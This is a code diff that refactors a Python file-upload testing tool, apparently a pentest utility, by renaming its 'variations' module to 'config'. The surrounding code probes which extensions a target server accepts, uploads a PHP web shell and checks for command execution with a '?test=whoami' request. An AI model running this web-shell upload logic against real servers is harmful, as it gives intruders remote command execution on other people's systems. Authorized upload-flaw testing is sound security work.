@@ -14,7 +14,7 @@ import requests
 import importlib
 from requests.exceptions import SSLError
 import json
-import variations
+import config
 from argparse import RawTextHelpFormatter
 
 #TODO
@@ -57,7 +57,7 @@ parser.add_argument("--status-codes", type=str, dest="status_codes", default="20
 parser.add_argument("--protocol", type=str, dest="protocol", default="https",help=f"Connection protocol to be used for uploads, default https\nUsage: {blue}--status-code https{reset}")
 parser.add_argument("--enable-redirects", action="store_true", dest="enable_redirects", default=False,help=f"If enabled, allows forms to redirect the requests\nUsage: {blue}--enable-redirects{reset}")
 parser.add_argument("--manual-check", action="store_true", dest="manual_check", default=False,help=f"If enabled, pauses the execution after each successful shell upload\nUsage: {blue}--manual-check{reset}")
-parser.add_argument("--disable-modules", type=str, dest="disable_modules", default=False,help=f"Disables specified modules\nUsage: {blue}--disable-modules " + ",".join(variations.active_modules) + f"{reset}")
+parser.add_argument("--disable-modules", type=str, dest="disable_modules", default=False,help=f"Disables specified modules\nUsage: {blue}--disable-modules " + ",".join(config.active_modules) + f"{reset}")
 
 options = parser.parse_args()
 
@@ -146,11 +146,11 @@ def set_progress_bar(max):
         "max": max
     }
 
-    variations.progress_bar = progress_bar
+    config.progress_bar = progress_bar
 
 def show_progress_bar():
-    variations.progress_bar["current"] += 1
-    draw_progress_bar(variations.progress_bar["current"], variations.progress_bar["max"])
+    config.progress_bar["current"] += 1
+    draw_progress_bar(config.progress_bar["current"], config.progress_bar["max"])
     return 
 
 def capitalise_random(string):
@@ -230,7 +230,7 @@ def test_accepted_formats(request_file, session, extensions_array):
     for extension in extensions_array:
         with open(f"assets/sample_files/sample.{extension}", 'rb') as file: file_data = file.read()
         file_name = generate_random_string(10) + f".{extension}"
-        response, session, headers, url, file_name = upload(request_file, session, file_data, file_name, variations.mimetypes[extension])
+        response, session, headers, url, file_name = upload(request_file, session, file_data, file_name, config.mimetypes[extension])
         if (check_success(response)):
             success(f"Filetype {extension} is accepted")
             accepted_extensions.append(extension)
@@ -271,18 +271,18 @@ def upload(request_file, session, file_data, file_name, file_content_type, timeo
     with open(request_file, 'r') as file:
         file_contents = file.read()
 
-        if "*filename*" not in file_contents:
+        if config.filename_marker not in file_contents:
             error("Inject point *filename* not present in the request file")
 
-        if "*content*" not in file_contents:
+        if config.content_marker not in file_contents:
             error("Inject point *content* not present in the request file")
 
     file_data_new = decoded_data
 
     content, headers, host, path = parse_request_file(request_file)
-    content = content.replace("*filename*", file_name)
+    content = content.replace(config.filename_marker, file_name)
 
-    url = f"{variations.protocol}://{host}{path}"
+    url = f"{config.protocol}://{host}{path}"
 
     try:
         if isinstance(content, list):
@@ -308,7 +308,7 @@ def upload(request_file, session, file_data, file_name, file_content_type, timeo
     if isinstance(file_data_new, bytes):
         file_data_new = file_data_new.decode('latin-1')
 
-    content = content.replace("*content*", file_data_new)
+    content = content.replace(config.content_marker, file_data_new)
 
     # Extract attributes based on the content type
     if "multipart/form-data" in str(headers):
@@ -323,7 +323,7 @@ def upload(request_file, session, file_data, file_name, file_content_type, timeo
         except SSLError:
 
             url_http = url.replace('https://', 'http://')  # Change protocol to http
-            variations.protocol = "http"
+            config.protocol = "http"
 
             warning(f"SSL error occurred. Switching to HTTP...")  
             response = session.post(url_http, data=multipart_data, headers=headers, allow_redirects=options.enable_redirects, verify=False, timeout=options.timeout)  # Sending a POST request to the url with the files, headers, and data provided.
@@ -345,7 +345,7 @@ def upload_and_validate(request_file, session, file_data, file_name, mimetype, m
     content, headers, host, path = parse_request_file(request_file)
     response, session, headers, url, file_name = upload(request_file, session, file_data, file_name, mimetype)
     if (real_extension != None): file_name = (file_name.split(".")[0]) + real_extension
-    upload_url = f"{variations.protocol}://{host}{options.upload_dir}"
+    upload_url = f"{config.protocol}://{host}{options.upload_dir}"
     if (options.global_verbosity < 2 and message != None): show_progress_bar()
     if (check_success(response)):
         if return_on_upload: return session, True
@@ -361,8 +361,8 @@ def upload_and_validate(request_file, session, file_data, file_name, mimetype, m
                 debug((upload_url + file_name + "?test=whoami"), 0)
                 if (check_result == "printed_out"):
                     extension = file_name.split(".")[-1]
-                    if (extension in variations.extensions["php"]):
-                        del variations.extensions["php"][variations.extensions["php"].index(extension)]
+                    if (extension in config.extensions["php"]):
+                        del config.extensions["php"][config.extensions["php"].index(extension)]
                         warning(f"Shell was printed as plain text, removing .{extension} extension")
                     else:
                         warning("Shell was printed as plain text")
@@ -392,9 +392,9 @@ def main():
     if (options.disable_modules != False):
         disabled_modules = options.disable_modules.split(",")
         for module in disabled_modules:
-            del variations.active_modules[variations.active_modules.index(module)]
+            del config.active_modules[config.active_modules.index(module)]
 
-    variations.protocol = options.protocol
+    config.protocol = options.protocol
     session = requests.Session()
     content, headers, host, path = parse_request_file(options.request_file)
     upload_url = f"http://{host}{options.upload_dir}"
@@ -406,10 +406,10 @@ def main():
         info("Testing for accepted file types")
         print()
     
-        accepted_extensions = test_accepted_formats(options.request_file, session, variations.extensions["normal"])
+        accepted_extensions = test_accepted_formats(options.request_file, session, config.extensions["normal"])
         debug(accepted_extensions, 3)
 
-        accepted_php_extensions = test_accepted_formats(options.request_file, session, variations.extensions["php"])
+        accepted_php_extensions = test_accepted_formats(options.request_file, session, config.extensions["php"])
         debug(accepted_extensions, 3)
 
         if (len(accepted_extensions) < 1 and len(accepted_php_extensions) < 1):
@@ -418,7 +418,7 @@ def main():
         if (len(accepted_php_extensions) > 0):
             for accepted_php_extension in accepted_php_extensions:
                 info(f"Trying to upload .{accepted_php_extension} shell...")
-                with open(variations.shell_path, 'rb') as file: file_data = file.read()
+                with open(config.shell_path, 'rb') as file: file_data = file.read()
                 file_name = generate_random_string(10) + f".{accepted_php_extension}"
                 session = upload_and_validate(options.request_file, session, file_data, file_name, "application/x-httpd-php")
 
@@ -430,7 +430,7 @@ def main():
 
     modules = importlib.import_module("modules")
 
-    for module in variations.active_modules:
+    for module in config.active_modules:
         getattr(modules, module)(options.request_file, session, options, accepted_extensions)
 
 
